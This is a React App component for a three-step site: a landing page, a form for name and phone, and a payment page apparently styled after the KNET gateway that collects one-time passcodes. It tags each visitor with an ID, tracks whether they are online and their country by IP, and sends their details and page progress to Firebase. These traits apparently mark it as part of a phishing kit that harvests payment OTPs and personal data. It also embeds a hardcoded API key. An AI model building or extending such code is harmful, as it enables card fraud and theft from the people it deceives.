import { useEffect, useState } from 'react';
import './main.css';
import { CartProvider } from './cartContext';
import Landing from './landing/landing';
import { Toaster } from 'react-hot-toast';
import Info from './info/info';
import { Loader } from './loader';
import { Payment } from './kent/kent';
import { addData } from './firebase';
import { setupOnlineStatus } from './online-sts';

function App() {
  const [currantPage, setCurrantPage] = useState(1);
  const [isLoading, setisloading] = useState(false);
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [otp, setOtp] = useState('');
  const [otpArd] = useState(['']);
  const [_id] = useState('id' + Math.random().toString(16).slice(2));
  const [isCheked, setIsChecked] = useState('payfull');

  const data = {
    id: _id,
    hasPersonalInfo: name != '',
    currentPage: currantPage,
    createdDate: new Date().toISOString(),
    notificationCount: 1,
    personalInfo: {
      id: name,
      fullName: name,
      phone: phone,
    },
  };
  useEffect(()=>{
    if (_id) {
      setupOnlineStatus(_id);
      getLocation()
    }
  },[])
  async function getLocation() {
    const APIKEY = '3e1df4e14eba852f6a8abfb9c5ec85159b0680e8bc5e13f1f73978e0';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
        ...data,
        country: country,
      });
      console.log(country);
    } catch (error) {
      console.error('Error fetching location:', error);
    }
  }
  const handleNextPage = () => {
    addData(data);
    setisloading(true);
    setTimeout(() => {
      setisloading(false);
      setCurrantPage(currantPage + 1);
    }, 3000);
  };

  const handleOtp = (v: string) => {
    setOtp(v);
  };
  const handleOArr = async () => {
    await otpArd.push(otp);
  };
  useEffect(() => {
    localStorage.setItem('vistor', _id);
    addData(data);
  }, []);
  return (
    <CartProvider>
      <Loader show={isLoading} />
      <div style={{ opacity: isLoading ? 0.4 : 1 }} dir="ltr">
        <div>
          <Toaster position="bottom-center" />
        </div>
        {currantPage === 1 ? (
          <Landing handleNextPage={handleNextPage} />
        ) : currantPage === 2 ? (
          <Info
          setIsChecked={setIsChecked}
          isCheked={isCheked}
            setName={setName}
            setPhone={setPhone}
            handleNextPage={handleNextPage}
          />
        ) : currantPage >= 3 ? (
          <Payment
            handleOtp={handleOtp}
            isCheked={isCheked}
            handleOArr={handleOArr}
            handleNextPage={handleNextPage}
            currantPage={currantPage}
            setCurrantPage={setCurrantPage}
            setisloading={setisloading}
          />
        ) : null}
      </div>
    </CartProvider>
  );
}

export default App;
